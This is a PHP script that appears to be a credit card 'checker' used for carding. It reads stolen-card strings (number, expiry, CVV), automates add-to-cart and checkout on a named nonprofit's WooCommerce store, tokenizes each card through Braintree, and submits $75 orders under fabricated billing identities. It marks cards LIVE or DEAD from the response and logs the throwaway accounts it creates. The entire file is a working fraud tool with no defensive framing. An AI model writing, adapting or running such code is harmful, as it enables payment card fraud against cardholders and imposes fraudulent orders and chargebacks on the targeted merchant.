<?php
error_reporting(0);
$time_start = microtime(true);

if($_SERVER['REQUEST_METHOD'] == 'POST'){
    extract($_POST);
}
else {
    extract($_GET);
}

function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function RandomString($length = 7)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$separator = explode("|", $lista);
$cc = $separator[0];
$mm = $separator[1];
$yy = $separator[2];
$cvv = $separator[3];
$postcode = mt_rand(10080, 94545);
$str = RandomString();
$username = RandomString().mt_rand(1, 999);

$cbin = substr($cc, 0,1);
if($cbin == 5){
    $cbin = 'master-card';
}
else if($cbin == 4){
    $cbin = 'visa';
}
else if($cbin == 3){
    $cbin = 'amex';
}
else {
    $cbin = 'null';
}

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://headwatersmusicandarts.org/?wc-ajax=add_to_cart',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$username.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$username.txt",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HEADER => 0,
        CURLOPT_HTTPHEADER => array(
            'accept: application/json, text/javascript, */*; q=0.01',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'origin: https://headwatersmusicandarts.org',
            'referer: https://headwatersmusicandarts.org/product-category/music-programming',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "product_sku=&product_id=5196&quantity=1",
    ));
    $addToCart = curl_exec($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://headwatersmusicandarts.org/checkout',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$username.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$username.txt",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HEADER => 1,
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'referer: https://headwatersmusicandarts.org/product-category/music-programming',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $prepare_checkout = curl_exec($ch);
    $checkout_nonce = GetStr($prepare_checkout, 'name="woocommerce-process-checkout-nonce" value="', '"');
    $braintree_nonce = GetStr($prepare_checkout, '"type":"credit_card","client_token_nonce":"', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://headwatersmusicandarts.org/wp-admin/admin-ajax.php',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$username.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$username.txt",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HEADER => 1,
        CURLOPT_HTTPHEADER => array(
            'accept: */*',
            'origin: https://headwatersmusicandarts.org',
            'referer: https://headwatersmusicandarts.org/checkout',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "action=wc_braintree_credit_card_get_client_token&nonce=$braintree_nonce",
    ));
    $admin_ajax = curl_exec($ch);
    $clientToken = GetStr($admin_ajax, '"data":"', '"');
    $decoded = base64_decode($clientToken);
    $parsedToken = GetStr($decoded, '"authorizationFingerprint":"', '"');
    $b3ClientId = GetStr($decoded, '"braintreeClientId":"', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$username.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$username.txt",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HEADER => 1,
        CURLOPT_HTTPHEADER => array(
            'accept: */*',
            'Authorization: Bearer '.$parsedToken,
            'braintree-version: 2018-05-10',
            'content-type: application/json',
            'Origin: https://assets.braintreegateway.com',
            'Referer: https://assets.braintreegateway.com/web/3.48.0/html/hosted-fields-frame.min.html',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"65610f8e-d349-4403-9cf2-a57d43251500"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yy.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
    ));
    $graphql = curl_exec($ch);
    $token = GetStr($graphql, '"token":"','"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://headwatersmusicandarts.org/?wc-ajax=checkout',
        CURLOPT_HEADER => 0,
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_COOKIEFILE => getcwd(). "/$username.txt",
        CURLOPT_COOKIEJAR => getcwd(). "/$username.txt",
        CURLOPT_HTTPHEADER => array(
            'accept-encoding: gzip, deflate, br',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'origin: https://headwatersmusicandarts.org',
            'referer: https://headwatersmusicandarts.org/checkout',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "billing_first_name=Robert&billing_last_name=Graham&billing_company=&billing_country=US&billing_address_1=857+Hayworth+Street&billing_address_2=&billing_city=Beverly+Hills&billing_state=CA&billing_postcode=$postcode&billing_phone=6508730750&billing_email=$username@gmail.com&billing_participants_first_name=Robert&billing_participants_last_name=Graham&participants_date_of_birth=01%2F02%2F01&second_participants_first_name=&second_participants_last_name=&second_participants_date_of_birth=&third_participants_first_name=&third_participants_last_name=&third_participants_date_of_birth=&instrument_the_student_plays=Guitar&additional_instruments=&music_program_policy_certification=1&art_program_policy_certification=1&createaccount=1&account_password=$username&emergency_contact_first_name=Jason&emergency_contact_phone=6508730750&additional_health_or_allergy_concerns=Sonian&order_comments=&guardians_first_name=Jason&guardians_last_name=Smith&thwcfe_disabled_fields=second_participants_first_name%2Csecond_participants_last_name%2Csecond_participants_date_of_birth%2Cdo_you_have_a_third_participant_to_register%2Cthird_participants_first_name%2Cthird_participants_last_name%2Cthird_participants_date_of_birth%2Csecond_participants_first_name%2Csecond_participants_last_name%2Csecond_participants_date_of_birth%2Cthird_participants_first_name%2Cthird_participants_last_name%2Cthird_participants_date_of_birth%2Cdo_you_have_a_third_participant_to_register%2Cthird_participants_first_name%2Cthird_participants_last_name%2Cthird_participants_date_of_birth%2Csecond_participants_first_name%2Csecond_participants_first_name%2Csecond_participants_first_name%2Csecond_participants_last_name%2Csecond_participants_date_of_birth%2Cthird_participants_first_name%2Cthird_participants_last_name%2Cthird_participants_date_of_birth%2Cdo_you_have_a_third_participant_to_register%2Cthird_participants_first_name%2Cthird_participants_last_name%2Cthird_participants_date_of_birth&thwcfe_disabled_sections=&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=$cbin&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=75.00&wc_braintree_credit_card_payment_nonce=$token&wc_braintree_paypal_payment_nonce=&wc_braintree_paypal_amount=75.00&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&terms=on&terms-field=1&woocommerce-process-checkout-nonce=$checkout_nonce&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review"
    ));
    $execute = curl_exec($ch);
    curl_close($ch);
    $respo = GetStr($execute, '<ul class="woocommerce-error" role="alert">', '</div>');
    fwrite(fopen("headwatersmusicandarts.org_accounts.txt", "a"), $username."@gmail.com:".$username."\r\n");

if(strpos($execute, 'Thank you')){

    echo '<tr><td><span class="badge badge-outline-success badge-pill">LIVE</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-success badge-pill">Authorized</span></td></tr><br>';
}
elseif(strpos($execute, 'card verification number does not match')){

    echo '<tr><td><span class="badge badge-outline-danger badge-pill">DEAD</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-danger badge-pill">'.$respo.'</span></td> <td><span class="badge badge-outline-danger badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
}
else {

    echo '<tr><td><span class="badge badge-outline-warning badge-pill">DEAD</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-warning badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
}
unlink("$username.txt");
?>
